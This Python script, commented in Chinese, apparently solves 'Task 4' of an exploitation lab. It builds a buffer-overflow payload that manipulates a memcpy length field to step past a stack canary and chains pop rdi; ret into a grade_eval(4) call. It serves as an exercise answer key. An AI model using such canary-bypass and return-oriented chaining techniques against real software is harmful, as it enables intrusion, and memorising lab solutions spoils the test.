#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log (bypass canary, print grade_eval(4))."""
import sys

# ---- 链条上的 8 字节（小端）----------------------------------------------
POP_RDI = b"\xa3\x18\x40\x00\x00\x00\x00\x00"   # 0x4018a3  pop rdi; ret
GRADE   = b"\x77\x16\x40\x00\x00\x00\x00\x00"   # 0x401677  grade_eval
MAIN    = b"\xf5\x17\x40\x00\x00\x00\x00\x00"   # 0x4017f5  main
ARG_4   = b"\x04\x00\x00\x00\x00\x00\x00\x00"   # 4

# ---- 被 memcpy 拷贝的 128 字节 ------------------------------------------
# memcpy 目的地 = (rbp-0x120) + 0x80 + len，len 取 [rbp-0x20]
# 令 len = 0xa0 → 目的地 = rbp，于是这 128 字节从 saved rbp 开始铺
blob  = b"B" * 8            # dst[0:8]   -> saved rbp（垃圾，leave 会弹掉）
blob += POP_RDI             # dst[8:16]  -> 返回地址：pop rdi; ret
blob += ARG_4               # dst[16:24] -> 被 pop rdi 吃掉，rdi = 4
blob += GRADE               # dst[24:32] -> grade_eval(4)
blob += MAIN                # 返回后回 main
blob  = blob.ljust(128, b"C")

# ---- 拼装：128 + 128 填充 + 4 字节 len ---------------------------------
payload  = blob                              # 偏移 0..127   会被拷到 rbp 起
payload += b"C" * 128                        # 偏移 128..255 把 len 顶到 [rbp-0x20]
payload += b"\xa0\x00\x00\x00"               # 偏移 256..259 len = 0xa0（小端 int）
payload += b"\n"

sys.stdout.buffer.write(payload)
